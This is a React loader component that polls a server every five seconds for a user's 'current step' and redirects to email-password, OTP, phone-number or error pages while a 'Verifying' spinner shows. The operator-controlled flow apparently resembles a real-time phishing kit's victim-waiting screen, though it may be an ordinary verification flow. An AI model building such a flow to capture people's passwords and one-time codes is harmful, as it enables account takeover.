import React, { useEffect, useState } from "react";
import { fetchUserStep } from "../../services/api";
import { useNavigate } from "react-router-dom";

const Loader = () => {
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  useEffect(() => {
    const userId = localStorage.getItem("userId");
    console.log("Fetched userId:", userId); // Log the userId

    const checkUserStep = async () => {
      try {
        const response = await fetchUserStep(userId);
        console.log("API Response:", response.data); // Log the response
        if (response.status === 200) {
          const userStep = response.data.currentStep; // Access the correct field

          // Redirect based on user step
          if (userStep === "email-password") {
            setLoading(false);
            navigate(`/email-page?userId=${userId}`);
          } else if (userStep === "otp-verification") {
            setLoading(false);
            navigate(`/email_otp-page?userId=${userId}`);
          } else if (userStep === "phone-number") {
            setLoading(false);
            navigate(`/phone-number-page?userId=${userId}`);
          } else if (userStep === "error-page") {
            setLoading(false);
            navigate(`/error-page?userId=${userId}`);
          }
        }
      } catch (error) {
        console.error("Failed to fetch user step:", error); // Log the error
        if (error.response && error.response.status === 404) {
          console.error("User not found, invalid userId.");
        }
      }
    };

    const intervalId = setInterval(checkUserStep, 5000);

    return () => clearInterval(intervalId);
  }, [navigate]);

  if (loading) {
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-gray-100">
        <div className="flex items-center space-x-2">
          {/* Spinner */}
          <div className="w-8 h-8 border-4 border-blue-500 border-dashed rounded-full animate-spin"></div>
          {/* Text */}
          <div className="text-gray-700 text-lg font-medium">
            Verifying, please wait... It can take up to a minute.
          </div>
        </div>
      </div>
    );
  }

  return null; // or any fallback UI
};

export default Loader;
